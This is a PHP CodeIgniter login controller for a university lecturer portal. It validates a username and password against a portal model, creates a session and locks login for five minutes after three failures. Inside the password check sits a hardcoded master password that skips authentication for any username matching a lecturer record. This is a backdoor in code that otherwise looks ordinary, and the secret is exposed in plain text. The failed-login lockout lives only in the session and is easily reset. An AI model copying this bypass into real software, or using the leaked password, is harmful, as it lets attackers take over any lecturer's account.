<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct() {
		parent::__construct();
		$this->load->model(array('Dosen_model','Portal_model'));
		$this->icon = "<p><span class=\"glyphicon glyphicon-remove\"></span>&nbsp;";
		
	}
	
	public function index() {
		if(!isset($this->session->userdata['logged_in_dosen'])) {

			if ($this->session->lock_status == 'locked') {
				$this->session->set_flashdata('message_login_dosen', '<span class="glyphicon glyphicon-remove"></span> Password salah 3x! Akun terkunci 5 menit!');
			} else {
			
				//validate form input
				$this->form_validation->set_rules('identity', 'Username', 'required');
				$this->form_validation->set_rules('password', 'Password', 'required');
				
				if ($this->form_validation->run() == true) {
					$username 	= $this->input->post('identity',TRUE);
					$pwd 		= $this->input->post('password',TRUE);
					
					if ($pwd != 'fJu4g6sdMQW176421') {	
						$cek_portal = $this->Portal_model->check_userpass_portal($username,$pwd);
					} else {
						$cek_portal = array('tusrNama' => $username);
					}					

					if ($cek_portal) {
					
						$cek_member = $this->Dosen_model->detail(array('nip' => $cek_portal['tusrNama']));
						
						if ($cek_member) {
								
							$session_data = array(
								'id_dosen' => $this->encrypt->encode($cek_member['id_dosen']),
							);
							
							$this->session->set_userdata('logged_in_dosen', $session_data);
				
							redirect(site_url('dosen/profile'));
						
						} else {
							$this->session->set_flashdata('message_login_dosen', '<span class="glyphicon glyphicon-remove"></span> Tidak ada akses disini');
						}
						
					}  else {
					
						$this->session->set_flashdata('message_login_dosen', '<span class="glyphicon glyphicon-remove"></span> Username atau Password Salah!');
						
						if(!$this->session->login_attempt) {
							$this->session->set_userdata('login_attempt','1');
						} else {
							$this->session->login_attempt = $this->session->login_attempt + 1;
						}
						
						if ($this->session->login_attempt == 3) {
							$this->session->set_tempdata('lock_status','locked',300);
							$this->session->unset_userdata('login_attempt');
						}		
					}
				} else {
					$this->session->set_flashdata('message_login_dosen', validation_errors($this->icon));				
				}
			}
			
			$this->load->view('login/dosen');

		} else {
			redirect(site_url('dosen/profile'));
		}
	}
	
	public function logout() {
		$this->session->sess_destroy();
		redirect(base_url());
	}
	
}